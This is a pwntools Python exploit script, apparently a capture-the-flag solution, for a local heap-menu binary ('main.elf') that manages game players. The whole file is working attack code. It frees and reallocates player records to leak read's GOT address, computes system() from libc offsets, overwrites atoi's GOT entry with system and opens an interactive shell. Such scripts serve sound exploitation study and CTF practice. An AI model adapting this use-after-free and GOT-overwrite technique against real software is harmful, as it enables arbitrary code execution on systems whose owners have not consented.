# -*- coding: utf-8 -*-
from pwn import *

# context.log_level = 'debug' 

p = process("./main.elf")
elf = ELF("./main.elf")
libc = ELF("libc.so.6")

# print proc.pidof(p)[0]

# print hex(elf.got["read"])  #0x6030a0
# print hex(elf.got["atoi"])  #0x603110
# print hex(elf.got["strlen"])  #0x603040

raw_input()

def add_palyer(name, attack = 1, defense = 2, speed = 3, precision = 4):
    p.recvuntil("Your choice: ")
    p.sendline("1")
    p.recvuntil("name: ")
    p.sendline(name)
    p.recvuntil("attack points: ")
    p.sendline(str(attack))
    p.recvuntil("defense points: ")
    p.sendline(str(defense))
    p.recvuntil("speed: ")
    p.sendline(str(speed))
    p.recvuntil("precision: ")
    p.sendline(str(precision))

def delete_palyer(index):
    p.recvuntil("Your choice: ")
    p.sendline("2")
    p.recvuntil("Enter index: ")
    p.sendline(str(index))

def select_palyer(index):
    p.recvuntil("Your choice: ")
    p.sendline("3")
    p.recvuntil("Enter index: ")
    p.sendline(str(index))

def  show_palyer():
    p.recvuntil("Your choice: ")
    p.sendline("5")

def edit_palyername(name):
    p.recvuntil("Your choice: ")
    p.sendline("4")
    p.recvuntil("Your choice: ")
    p.sendline("1")
    p.recvuntil("Enter new name: ")
    p.sendline(name)

def pwning(target):
    p.recvuntil("Your choice: ")
    p.sendline("2")
    p.recvuntil("Enter attack points: ")
    p.sendline(target)


# ---------info leak---------
add_palyer("A"*0x40)
add_palyer("A"*0x40)
select_palyer(1)

# free 
delete_palyer(1)
delete_palyer(0)

# keep space
# two malloc
# b *0x00000000004018A7 
# b *0x0000000000401955
# yin wei malloc(len+1) in the binary
# add_palyer("B"*0x17)0x603070
leakread = "\x02\x02\x01\x01"*4  + "\xa0\x30\x60"
print len(leakread)
add_palyer(leakread)
# use
# b *0x00000000004020D2 
show_palyer()
p.recvuntil("Name: ")
leak = p.recv(6).ljust(8, '\x00')
read_addr =u64(leak)
print  "read_addr = " +  hex(read_addr)

print "\ncalculating system() addr and \"/bin/sh\" addr ... ###"
system_addr = read_addr - (libc.symbols['read'] - libc.symbols['system'])
print "system_addr = " + hex(system_addr)
# binsh_addr = read_addr - (libc.symbols['read'] - next(libc.search("/bin/sh")))
# print "binsh_addr = " + hex(binsh_addr)


# ---------write got---------
delete_palyer(0)
add_palyer("B"*0x40)
add_palyer("B"*0x40)
select_palyer(0)
delete_palyer(0)
delete_palyer(1)
writeAtoiAddr = "\x02\x02\x01\x01"*4  + "\x10\x31\x60"
# writeStrlenAddr = "\x02\x02\x01\x01"*4  + "\x40\x30\x60"
add_palyer(writeAtoiAddr)
edit_palyername(p64(system_addr))
# raw_input()
p.sendline("sh")
# raw_input()
# b *0x0000000000401E49
# pwning(p64(binsh_addr))

p.interactive()
